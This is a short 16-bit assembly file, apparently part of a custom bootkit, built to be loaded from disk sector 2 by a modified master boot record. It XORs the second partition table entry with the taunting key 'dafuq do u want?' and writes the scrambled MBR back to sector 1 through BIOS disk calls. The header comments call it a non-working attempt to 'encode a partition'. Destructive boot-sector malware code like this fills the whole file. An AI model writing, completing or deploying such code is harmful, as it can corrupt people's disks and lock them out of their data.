;
;   This bytes generated from this code should be placed in sector 2 of
;   a disk.
;   The custom mbr should call into this code.
;
;   This code attempts to encode a partition.
;   Doesn't work, windows reports an error and then fixed the partitions
;
;

[bits 16]
[org 0x800]

%define NEW_MBR_ADDR            0x600
%define SECTOR_TWO_ADDR         0x800
%define PART_2_OFFSET           0x1ce

_start:
    pusha
    call _reset_disk

    lea di, [NEW_MBR_ADDR + PART_2_OFFSET]  ; get MBR start address
    mov si, xor_string          ; load strings to xor
    xor bx, bx                  ; use bx as counter

    push dx                     ; we want save disk type

_xor_loop:
    cmp bx, 0x10                ; loop 32 times ~ 2 entries
    jge _xor_end

    ; mod the counter to repeat xor string
    xor dx, dx                  ; dx contains remainder
    mov ax, bx                  ; load current counter/index to ax
    mov cx, 0x10                ; length of xor string
    div cx                      ; do ax / cx
                                ; dx contains remainder, ax contains quotient
    mov cx, bx                  ; save current counter/index
    mov bx, dx                  ; use remainder to index into xor string
    mov al, byte [si + bx]      ; can only use bx to index [] in asm
    mov bx, cx
    mov cl, byte [di + bx]      ; use current counter to index to entry/memory
    xor al, cl
    mov [di + bx], al

    inc bx
    jmp _xor_loop
_xor_end:
    pop dx                      ; restore disk type

    ; write the local copy of the partition onto the disk
    mov al, 0x1                 ; we want to laod one sector
    mov ch, 0x0                 ; cylinder
    mov dh, 0x0                 ; head
    mov cl, 0x1                 ; first sector
    mov bx, NEW_MBR_ADDR
    call _write_sector_chs

    mov si, xor_done            ; print success message
    call _print_str

    popa
    ret

_reset_disk:
    mov ah, 0x0
    int 0x13                    ; reset the disk
    jc _disk_io_error
    ret

_write_sector_chs:
    mov ah, 0x3
    int 0x13
    jc _disk_io_error
    ret

_disk_io_error:
    mov si, disk_io_error_msg
    call _print_str
    jmp _end_loop

_print_str:
    lodsb
    or al, al               ; did we reach a null byte?
    jz _print_end
    mov ah, 0xe
    int 0x10
    jmp _print_str

_print_end:
    ret

_end_loop:                  ; after printing an error, we should just loop forever
    jmp _end_loop

disk_io_error_msg:          db "[XOR] Disk IO error!", 0x0a, 0x00
xor_string:                 db "dafuq do u want?", 0x00
xor_done:                   db "Finish xor-ing.", 0x00
